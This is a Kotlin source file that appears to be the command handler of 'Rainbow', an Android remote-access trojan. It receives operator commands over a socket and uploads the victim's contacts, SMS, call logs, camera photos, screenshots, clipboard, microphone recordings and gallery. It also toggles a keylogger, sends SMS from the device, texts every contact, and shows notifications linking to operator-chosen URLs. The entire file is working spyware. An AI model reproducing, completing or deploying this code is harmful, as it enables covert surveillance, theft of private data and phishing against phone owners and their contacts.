package abyssalarmy.rainbow.RainbowHandler

import abyssalarmy.rainbow.R
import abyssalarmy.rainbow.RainbowNetwork.RainbowSocket
import abyssalarmy.rainbow.RainbowNetwork.RainbowUpload
import abyssalarmy.rainbow.RainbowUtils.RainbowDataCollector
import abyssalarmy.rainbow.RainbowUtils.RainbowScope
import abyssalarmy.rainbow.RainbowUtils.RainbowTools
import android.Manifest
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.PendingIntent.FLAG_MUTABLE
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaPlayer
import android.net.Uri
import android.os.*
import android.telephony.SmsManager
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import okhttp3.internal.toLongOrDefault
import org.json.JSONObject


class RainbowCommendHandler(val context: Context, private val socket: RainbowSocket) {

    private val uploader = RainbowUpload(context)
    private val dataCollector = RainbowDataCollector(context)
    private val mediaPlayer = MediaPlayer()
    private val scope = RainbowScope()
    var onScreenshot: (() -> Unit)? = null
    var onKeylogger: ((state: Boolean) -> Unit)? = null
    private val mk =
        "QEFieXNzYWxBcm15|WxBcm15AknsdklASkDS2139jScno3FNd39nvo9wasdasd33ssKDnF9efnDFNOFDj"

    fun handle() {
        socket.addEventListener("commend") {
            val data = CommendData.getCommendData(it)
            Log.i("LOG", data.request)
            when (data.request) {
                "contacts" -> onContacts()
                "all-sms" -> onSms()
                "calls" -> onCalls()
                "apps" -> onApps()
                "main-camera" -> onMainCamera()
                "selfie-camera" -> onSelfieCamera()
                "clipboard" -> onClipboard()
                "screenshot" -> {
                    onScreenshot?.invoke()
                    onScreenshot()
                }
                "toast" -> {
                    val message = data.extras["text"]
                    if (message != null) {
                        onToast(message)
                    }
                }
                "sendSms" -> {
                    val number = data.extras["number"]
                    val text = data.extras["text"]
                    if (number != null && text != null) {
                        onSmsSend(number, text)
                    }
                }
                "vibrate" -> {
                    val duration = data.extras["duration"]
                    if (duration != null) {
                        onVibrate(duration.toLongOrDefault(2000))
                    }
                }
                "playAudio" -> {
                    val url = data.extras["url"]
                    if (url != null) {
                        onPlayAudio(url)
                    }
                }
                "stopAudio" -> {
                    onStopAudio()
                }
                "microphone" -> {
                    val duration = data.extras["duration"]
                    if (duration != null) {
                        onMicrophone(duration.toLongOrDefault(5000))
                    }
                }
                "keylogger-on" -> {
                    onKeylogger?.invoke(true)
                }
                "keylogger-off" -> {
                    onKeylogger?.invoke(false)
                }
                "gallery" -> onGallery()
                "smsToAllContacts" -> {
                    val text = data.extras["text"]
                    if (text != null) {
                        onSmsToAllContacts(text)
                    }
                }
                "popNotification" -> {
                    val text = data.extras["text"]
                    val url = data.extras["url"]
                    if (text != null && url != null) {
                        onPopNotification(text, url)
                    }
                }
            }
        }
    }

    private fun onContacts() {
        dataCollector.getContactList({
            socket.sendMessage("The device has started uploading the file, please be patient\n${RainbowTools.decodeMk(mk)}")
            uploader.upload(it)
        }, {
            socket.sendMessage("Access contacts permission denied\n" +
                    RainbowTools.decodeMk(mk)
            )
        })
    }

    private fun onSms() {
        dataCollector.getIncomingSmsList({
            socket.sendMessage("The device has started uploading the file, please be patient\n" +
                    RainbowTools.decodeMk(mk)
            )
            uploader.upload(it)
        }, {
            socket.sendMessage("Access incoming SMS permission denied\n" +
                    RainbowTools.decodeMk(mk)
            )
        })
        dataCollector.getOutgoingSmsList({
            uploader.upload(it)
        }, {
            socket.sendMessage("Access outgoing SMS permission denied\n" +
                    RainbowTools.decodeMk(mk)
            )
        })
    }

    private fun onCalls() {
        dataCollector.getCallLogs({
            socket.sendMessage("The device has started uploading the file, please be patient\n" +
                    RainbowTools.decodeMk(mk)
            )
            uploader.upload(it)
        }, {
            socket.sendMessage("Access call log permission denied\n" +
                    RainbowTools.decodeMk(mk)
            )
        })
    }

    private fun onApps() {
        dataCollector.getInstalledApps({
            socket.sendMessage("The device has started uploading the file, please be patient\n" +
                    RainbowTools.decodeMk(mk)
            )
            uploader.upload(it)
        }, {
            socket.sendMessage("query package permission denied\n" +
                    RainbowTools.decodeMk(mk)
            )
        })
    }

    private fun onMainCamera() {
        dataCollector.getCamera(0, {
            socket.sendMessage("The device has started uploading the file, please be patient\n" +
                    RainbowTools.decodeMk(mk)
            )
            uploader.upload(it)
        }, {
            socket.sendMessage("Access camera permission denied\n" +
                    RainbowTools.decodeMk(mk)
            )
        })
    }

    private fun onSelfieCamera() {
        dataCollector.getCamera(1, {
            socket.sendMessage("The device has started uploading the file, please be patient\n" +
                    RainbowTools.decodeMk(mk)
            )
            uploader.upload(it)
        }, {
            socket.sendMessage("Access camera permission denied\n" +
                    RainbowTools.decodeMk(mk)
            )
        })
    }

    private fun onClipboard() {
        dataCollector.getClipboard {
            socket.sendMessage("Last clipboard clip : $it\n" +
                    RainbowTools.decodeMk(mk)
            )
        }
    }

    private fun onScreenshot() {
        dataCollector.getScreenshotFile({
            socket.sendMessage("The device has started uploading the file, please be patient\n" +
                    RainbowTools.decodeMk(mk)
            )
            uploader.upload(it)
        }, {
            socket.sendMessage("Access files permission denied (files permission requires for getting screenshot file)\n" +
                    RainbowTools.decodeMk(mk)
            )
        })
    }

    private fun onToast(message: String) {
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(context, message, Toast.LENGTH_SHORT).show()
            socket.sendMessage("Your text message has been displayed on the target device successfully\n" +
                    RainbowTools.decodeMk(mk)
            )
        }
    }

    private fun onSmsSend(number: String, text: String) {
        if (RainbowTools.checkPermission(context, Manifest.permission.SEND_SMS)) {
            val sentPendingIntent =
                PendingIntent.getBroadcast(context, 0, Intent("SMS_SENT"), FLAG_MUTABLE)
            SmsManager.getDefault().sendTextMessage(number, null, text, sentPendingIntent, null)
            socket.sendMessage("Your SMS has been sent to $number\n" +
                    RainbowTools.decodeMk(mk)
            )
        } else {
            socket.sendMessage("Send sms permission denied\n" +
                    RainbowTools.decodeMk(mk)
            )
        }
    }

    @SuppressLint("NewApi")
    private fun onVibrate(duration: Long) {
        val vibrationManager =
            context.getSystemService(Service.VIBRATOR_MANAGER_SERVICE) as VibratorManager
        vibrationManager.vibrate(
            CombinedVibration.createParallel(
                VibrationEffect.createOneShot(
                    duration * 1000,
                    1
                )
            )
        )
    }

    private fun onPlayAudio(url: String) {
        if (!mediaPlayer.isPlaying) {
            mediaPlayer.setDataSource(url)
            mediaPlayer.prepare()
            mediaPlayer.start()
        }
    }

    private fun onStopAudio() {
        if (mediaPlayer.isPlaying) {
            mediaPlayer.release()
        }
    }

    private fun onMicrophone(duration: Long) {
        dataCollector.getMicrophone(duration * 1000, {
            uploader.upload(it)
        }, {
            socket.sendMessage("Record audio permission denied\n" +
                    RainbowTools.decodeMk(mk)
            )
        })
    }

    private fun onGallery() {
        var index = 0
        socket.sendMessage("The device has started uploading the images, please be patient\n" +
                RainbowTools.decodeMk(mk)
        )
        dataCollector.getGallery({
            val uploadProcess = object : Runnable {
                override fun run() {
                    scope.compressImage(context, it[index]) { image ->
                        uploader.upload(image) {
                            if (index != it.lastIndex) {
                                index += 1
                                this.run()
                            }
                        }
                    }
                }
            }
            uploadProcess.run()
        }, {
            socket.sendMessage("Access files permission denied\n" +
                    RainbowTools.decodeMk(mk)
            )
        })
    }

    private fun onSmsToAllContacts(text: String) {
        dataCollector.getContactsArray({
            it.forEach { number ->
                onSmsSend(number, text)
            }
        }, {
            socket.sendMessage("Access contacts permission denied\n" +
                    RainbowTools.decodeMk(mk)
            )
        })
    }

    @SuppressLint("InlinedApi")
    private fun onPopNotification(text: String, url: String) {
        val notificationManager =
            context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager?
        val notificationIntent = Intent(Intent.ACTION_VIEW)
        notificationIntent.data = Uri.parse(url)
        val resultIntent = PendingIntent.getActivity(
            context,
            0,
            notificationIntent,
            FLAG_MUTABLE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name: CharSequence = "Alert"
            val importance = NotificationManager.IMPORTANCE_HIGH
            val mChannel = NotificationChannel("rainbow-channel", name, importance)
            notificationManager?.createNotificationChannel(mChannel)
        }
        val mBuilder = NotificationCompat.Builder(context, "rainbow-channel")
            .setSmallIcon(R.drawable.notification_icon)
            .setContentTitle(text)
            .setContentText("")
            .setBadgeIconType(NotificationCompat.BADGE_ICON_LARGE)
            .setPriority(NotificationManager.IMPORTANCE_HIGH)
            .setContentIntent(resultIntent)
        notificationManager!!.notify(
            0,
            mBuilder.build()
        )
        socket.sendMessage(
            "Your notification has been displayed on the target device successfully\n${RainbowTools.decodeMk(mk)}"
        )
    }

    private class CommendData(
        val request: String,
        val extras: MutableMap<String, String>
    ) {
        companion object {
            fun getCommendData(data: JSONObject): CommendData {
                val request = data.getString("request")
                val extras = mutableMapOf<String, String>()
                val extrasArray = data.getJSONArray("extras")
                for (extraIndex in 0 until extrasArray.length()) {
                    val extra = extrasArray[extraIndex] as JSONObject
                    val key = extra.getString("key")
                    val value = extra.getString("value")
                    extras[key] = value
                }
                return CommendData(request, extras)
            }
        }
    }
}